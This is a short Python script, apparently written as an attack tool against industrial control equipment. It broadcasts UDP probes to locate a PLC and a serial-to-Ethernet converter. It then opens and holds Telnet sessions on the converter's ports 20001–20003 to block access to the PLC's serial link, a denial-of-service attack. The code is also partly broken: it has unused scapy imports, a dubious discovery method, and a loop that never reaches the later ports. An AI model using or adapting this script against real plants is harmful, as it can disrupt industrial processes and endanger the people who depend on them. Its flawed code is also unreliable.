import socket
import struct
import scapy.all as scapy
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether, ARP
import telnetlib

# Define the PLC's IP address and port
plc_ip = None
plc_port = 102

# Define the serial to Ethernet converter's IP address and ports
converter_ip = None
converter_ports = [20001, 20002, 20003]

# Function to scan the network for the PLC's IP address
def find_plc_ip():
    global plc_ip
    # Send a broadcast message to the network to find the PLC
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.sendto(b"Hello, PLC!", ("255.255.255.255", plc_port))
    # Listen for a response from the PLC
    sock.settimeout(1)
    try:
        data, addr = sock.recvfrom(1024)
        plc_ip = addr[0]
        print(f"Found PLC at IP address {plc_ip}")
    except socket.timeout:
        print("No PLC found on the network")
    sock.close()

# Function to find the serial to Ethernet converter's IP address
def find_converter_ip():
    global converter_ip
    # Send a broadcast message to the network to find the converter
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.sendto(b"Hello, Converter!", ("255.255.255.255", 102))
    # Listen for a response from the converter
    sock.settimeout(1)
    try:
        data, addr = sock.recvfrom(1024)
        converter_ip = addr[0]
        print(f"Found converter at IP address {converter_ip}")
    except socket.timeout:
        print("No converter found on the network")
    sock.close()

# Function to block access to the serial COM
def block_serial_com():
    global converter_ip, converter_ports
    if converter_ip is not None:
        for port in converter_ports:
            try:
                # Create a Telnet connection to the converter
                tn = telnetlib.Telnet(converter_ip, port)
                print(f"Connected to converter on port {port}")
                # Hold the connection open to block access to the serial COM
                while True:
                    tn.write(b"Hello\n")
                    response = tn.read_until(b"\n", 1)
                    if response:
                        print(response)
            except socket.error:
                print(f"Failed to connect to converter on port {port}")
    else:
        print("Converter IP address not found")

# Main function
def main():
    find_plc_ip()
    find_converter_ip()
    block_serial_com()

if __name__ == "__main__":
    main()